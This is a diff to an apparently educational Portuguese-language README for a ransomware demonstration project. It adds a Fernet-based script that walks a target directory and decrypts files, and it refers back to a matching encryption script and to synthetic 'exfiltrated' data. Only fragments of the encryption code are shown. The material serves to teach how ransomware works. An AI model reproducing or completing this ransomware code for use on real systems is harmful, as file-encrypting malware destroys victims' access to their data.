@@ -36,7 +36,7 @@ import os`
         chave_arquivo.write(chave)`
 
 ## carregar chave salva em arquivo
-   `return open("chave.key", "rb").read()``
+   `return open("chave.key", "rb").read()`
 
 ## Função para criptografar arquivos
 `def criptografar_arquivo(arquivo, chave):
@@ -90,6 +90,75 @@ import os`
 # Agora com nosso script para criptografar feito precisamos fazer o script para descriptografar.
 
 ---
+
+
+## Importando as bibliotecas.
+
+`from cryptography.fernet import Fernet 
+import os`   
+
+## Função para carregar a chave
+`def carregar_chave():
+    return open("chave.key", "rb").read()`  
+
+    
+
+## Função para descriptografar arquivos
+`def descriptografar_arquivo(arquivo,chave):
+    f = Fernet(chave)
+    with open(arquivo, "rb") as file:
+        dados_criptografados = file.read()
+        dados_descriptografados = f.decrypt(dados_criptografados)
+    with open(arquivo, "wb") as file:
+        file.write(dados_descriptografados)`
+
+
+        
+
+## Função para encontrar arquivos a serem descriptografados
+`def encontrar_arquivos(diretorio):  
+    lista = []  
+    for raiz, _, arquivos in os.walk(diretorio):
+        for nome in arquivos:
+            caminho = os.path.join(raiz, nome)
+            if nome != "ransomware.py"  and not nome.endswith(".key"):
+                lista.append(caminho)
+    return lista`  
+    
+
+
+
+    
+## Exemplo de uso
+
+`def main():
+    chave = carregar_chave()
+    arquivos = encontrar_arquivos("malware")  # Substitua pelo diretório alvo
+    for arquivo in arquivos:   
+        descriptografar_arquivo(arquivo, chave)
+    print("Descriptografia concluída! Seus arquivos foram restaurados.")`
+    
+
+
+
+## Execução principal   
+`if __name__ == "__main__":  
+    main()`
+
+---
+
+
+**"Após finalizar o script, criei arquivos de texto contendo dados sintéticos para simular informações exfiltradas. A imagem abaixo ilustra o formato e a estrutura dos arquivos gerados."**
+
+
+
+---
+
+
+
+
+<img width="655" height="533" alt="image" src="https://github.com/user-attachments/assets/2c75325c-33db-4a6e-bca1-85634df995b7" />
+
 
 
 
